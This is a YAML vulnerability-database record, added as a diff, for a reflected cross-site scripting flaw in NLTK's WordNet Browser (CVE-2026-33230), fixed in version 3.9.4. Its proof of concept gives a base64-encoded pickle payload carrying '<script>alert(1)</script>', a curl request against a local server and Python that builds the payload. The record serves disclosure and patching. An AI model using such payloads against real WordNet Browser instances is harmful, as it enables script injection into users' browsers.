@@ -1,0 +1,163 @@
+advisory_id: GHSA-gfwx-w7gr-fvh7
+datasource_id: github_osv/GHSA-gfwx-w7gr-fvh7
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-gfwx-w7gr-fvh7/GHSA-gfwx-w7gr-fvh7.json
+aliases:
+  - CVE-2026-33230
+summary: |
+  Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') in nltk
+  ### Summary
+  `nltk.app.wordnet_app` contains a reflected cross-site scripting issue in the `lookup_...` route. A crafted `lookup_<payload>` URL can inject arbitrary HTML/JavaScript into the response page because attacker-controlled `word` data is reflected into HTML without escaping. This impacts users running the local WordNet Browser server and can lead to script execution in the browser origin of that application.
+
+  ### Details
+  The vulnerable flow is in `nltk/app/wordnet_app.py`:
+
+  - [`nltk/app/wordnet_app.py:144`](/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L144)
+    - Requests starting with `lookup_` are handled as HTML responses:
+    - `page, word = page_from_href(sp)`
+
+  - [`nltk/app/wordnet_app.py:755`](/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L755)
+    - `page_from_href()` calls `page_from_reference(Reference.decode(href))`
+
+  - [`nltk/app/wordnet_app.py:769`](/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L769)
+    - `word = href.word`
+
+  - [`nltk/app/wordnet_app.py:796`](/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L796)
+    - If no results are found, `word` is inserted directly into the HTML body:
+    - `body = "The word or words '%s' were not found in the dictionary." % word`
+
+  This is inconsistent with the `search` route, which does escape user input:
+
+  - [`nltk/app/wordnet_app.py:136`](/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L136)
+    - `word = html.escape(...)`
+
+  As a result, a malicious `lookup_...` payload can inject script into the response page.
+
+  The issue is exploitable because:
+
+  - `Reference.decode()` accepts attacker-controlled base64-encoded pickle data for the URL state.
+  - The decoded `word` is reflected into HTML without `html.escape()`.
+  - The server is started with `HTTPServer(("", port), MyServerHandler)`, so it listens on all interfaces by default, not just `localhost`.
+
+  ### PoC
+  1. Start the WordNet Browser in an isolated Docker environment:
+
+  ```bash
+  docker run -d --name nltk-wordnet-web -p 8002:8002 \
+    nltk-sandbox \
+    python -c "import nltk; nltk.download('wordnet', quiet=True); from nltk.app.wordnet_app import wnb; wnb(8002, False)"
+  ```
+
+  2. Use the following crafted payload, which decodes to:
+
+  ```python
+  ("<script>alert(1)</script>", {})
+  ```
+
+  Encoded payload:
+
+  ```text
+  gAWVIQAAAAAAAACMGTxzY3JpcHQ-YWxlcnQoMSk8L3NjcmlwdD6UfZSGlC4=
+  ```
+
+  3. Request the vulnerable route:
+
+  ```bash
+  curl -s "http://127.0.0.1:8002/lookup_gAWVIQAAAAAAAACMGTxzY3JpcHQ-YWxlcnQoMSk8L3NjcmlwdD6UfZSGlC4="
+  ```
+
+  4. Observed result:
+
+  ```text
+  The word or words '<script>alert(1)</script>' were not found in the dictionary.
+  ```
+  <img width="867" height="208" alt="127" src="https://github.com/user-attachments/assets/ec09da08-09bc-4fc4-bfc1-c4489e9adaf6" />
+
+
+  I also validated the issue directly at function level in Docker:
+
+  ```python
+  import base64
+  import pickle
+
+  from nltk.app.wordnet_app import page_from_href
+
+  payload = base64.urlsafe_b64encode(
+      pickle.dumps(("<script>alert(1)</script>", {}), -1)
+  ).decode()
+
+  page, word = page_from_href(payload)
+  print(word)
+  print("<script>alert(1)</script>" in page)
+  ```
+
+  Observed output:
+
+  ```text
+  WORD= <script>alert(1)</script>
+  HAS_SCRIPT= True
+  ```
+
+  ### Impact
+  This is a reflected XSS issue in the NLTK WordNet Browser web UI.
+
+  An attacker who can convince a user to open a crafted `lookup_...` URL can execute arbitrary JavaScript in the origin of the local WordNet Browser application. This can be used to:
+
+  - run arbitrary script in the browser tab
+  - manipulate the page content shown to the user
+  - issue same-origin requests to other WordNet Browser routes
+  - potentially trigger available UI actions in that local app context
+
+  This primarily impacts users who run `nltk.app.wordnet_app` as a local or self-hosted HTTP service and open attacker-controlled links.
+impacted_packages:
+  - purl: pkg:pypi/nltk
+    affected_versions: vers:pypi/<=3.9.3
+    fixed_versions: vers:pypi/3.9.4
+    affected_packages:
+      - pkg:pypi/nltk@3.9.3
+    fixed_packages:
+      - pkg:pypi/nltk@3.9.4
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/nltk/nltk
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/nltk/nltk
+        commit: 40d0bc1d484a3458d6a63ecb5ba4957ab16ba14e
+        patch_text:
+      - vcs_url: https://github.com/nltk/nltk
+        commit: 1c3f799607eeb088cab2491dcf806ae83c29ad8f
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '6.1'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-gfwx-w7gr-fvh7/GHSA-gfwx-w7gr-fvh7.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-79
+references:
+  - url: https://github.com/nltk/nltk
+    reference_type:
+    reference_id:
+  - url: https://github.com/nltk/nltk/commit/1c3f799607eeb088cab2491dcf806ae83c29ad8f
+    reference_type:
+    reference_id:
+  - url: https://github.com/nltk/nltk/commit/40d0bc1d484a3458d6a63ecb5ba4957ab16ba14e
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-33230
+    reference_type:
+    reference_id: CVE-2026-33230
+  - url: https://github.com/nltk/nltk/security/advisories/GHSA-gfwx-w7gr-fvh7
+    reference_type:
+    reference_id: GHSA-gfwx-w7gr-fvh7
+exploits: []
